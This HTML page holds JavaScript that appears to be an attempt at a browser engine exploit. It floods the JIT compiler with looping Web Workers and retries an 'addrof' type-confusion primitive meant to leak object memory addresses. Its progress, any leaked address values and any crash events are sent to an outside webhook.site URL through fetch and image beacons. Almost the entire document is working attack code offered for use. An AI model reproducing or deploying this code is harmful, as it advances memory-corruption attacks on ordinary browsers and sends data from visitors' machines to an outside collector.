<!DOCTYPE html>
<html><body>
<h1 id="s">Running...</h1>
<script>
// Webhook URL'ini buraya yaz
var WEBHOOK = "https://webhook.site/1aea902d-b743-4df9-9f11-f3b22f979db5";

function send(msg){
  try {
    fetch(WEBHOOK+"?m="+encodeURIComponent(msg), {mode:'no-cors'});
  } catch(e){}
  // fetch olmasa bile img tag ile
  try {
    new Image().src = WEBHOOK+"?m="+encodeURIComponent(msg);
  } catch(e){}
}

// Crash/unload öncesi son şans
window.addEventListener('beforeunload', function(){
  send('BEFOREUNLOAD at attempt:'+window._attempt+' lastVal:'+window._lastVal);
});

window.addEventListener('error', function(e){
  send('ERROR: '+e.message+' at attempt:'+window._attempt);
});

var wStress=`
  function leak(o){return o.a+o.b+o.c+o.d;}
  for(var i=0;i<300000;i++) leak({a:1.1,b:2.2,c:3.3,d:4.4});
  while(true){
    var arr=[];
    for(var i=0;i<10000;i++) arr.push({a:i,b:i+1,c:i+2,d:i+3});
    leak(arr[0]);
    arr=null;
  }
`;
var u=URL.createObjectURL(new Blob([wStress],{type:'text/javascript'}));
for(var i=0;i<6;i++) new Worker(u);

function addrof(val){
  var arr=[1.1,2.2,3.3];
  function rd(a){return a[0];}
  for(var i=0;i<200000;i++) rd([1.1,2.2,3.3]);
  arr[0]=val;
  return rd(arr);
}

var target={secret:0x1337};
window._attempt=0;
window._lastVal='none';

function probe(){
  window._attempt++;
  var leaked=addrof(target);
  var buf=new ArrayBuffer(8);
  var dv=new DataView(buf);
  dv.setFloat64(0,leaked,true);
  var lo=dv.getUint32(0,true);
  var hi=dv.getUint32(4,true);
  var isNaN_val=(hi===0x7ff80000&&lo===0);

  if(!isNaN_val){
    var val='0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0');
    window._lastVal=val;
    send('ADDROF GOT: '+val+' attempt:'+window._attempt);
    document.getElementById('s').textContent='✅ '+val;
    return;
  }

  if(window._attempt%100===0){
    send('alive attempt:'+window._attempt);
    document.getElementById('s').textContent='attempt:'+window._attempt;
  }

  setTimeout(probe,5);
}

setTimeout(probe,3000);
</script>
</body></html>
